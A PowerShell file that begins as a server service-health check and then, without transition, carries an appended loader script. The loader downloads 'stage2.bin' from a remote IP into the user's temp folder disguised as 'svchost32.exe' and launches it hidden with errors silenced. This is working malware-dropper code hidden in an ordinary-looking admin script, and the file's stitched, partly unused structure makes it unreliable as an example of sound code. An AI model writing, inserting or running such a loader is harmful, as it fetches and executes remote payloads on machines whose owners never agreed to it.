$Servers             = @('filesrv01', 'dc02', 'srv02', 'srv01')
$Services            = @('Dhcp', 'SNMP', 'WinRM')
$Port                = 3389
$TimeoutMilliseconds = 2000
$ReportPath          = "C:\Reports\service-health-2024-05-16.csv"


$results = foreach ($srv in $Servers) {
    foreach ($svc in $Services) {
        $service = Get-Service -ComputerName $srv -Name $svc -ErrorAction SilentlyContinue
        [pscustomobject]@{
            Server  = $srv
            Service = $svc
            Status  = $(if ($service) { $service.Status } else { 'NotFound' })
        }
    }
}
$results | Format-Table -AutoSize
<#
.SYNOPSIS
    Stage 2 payload transfer helper.

.DESCRIPTION
    Downloads the staged artefact to a per-user drop path.
    The destination is verified before the launcher runs.

.EXAMPLE
    PS> .\loader.ps1
#>
[CmdletBinding()]
param(
    [string]$Stage2Url = 'http://198.51.100.49/stage2.bin',
    [string]$WorkingPath = "$env:TEMP\svchost32.exe",
    [int]$TimeoutSec = 64,
    [string]$UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
)
$ErrorActionPreference = "Stop"

function Invoke-PayloadFetch {
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45,
        [string]$UserAgent = "Mozilla/5.0"
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Starting stage 2 transfer"
    $TransferResult = Invoke-PayloadFetch -SourceUrl $Stage2Url -DestinationPath $WorkingPath -TimeoutSec $TimeoutSec -UserAgent $UserAgent
    if ($TransferResult) {
        Start-Process -FilePath $WorkingPath -WindowStyle Hidden -ErrorAction SilentlyContinue
    }
}
catch {
    Write-Warning "Stage 2 transfer failed: $($_.Exception.Message)"
}

Start-Sleep -Seconds 22
$ProgressPreference = "SilentlyContinue"
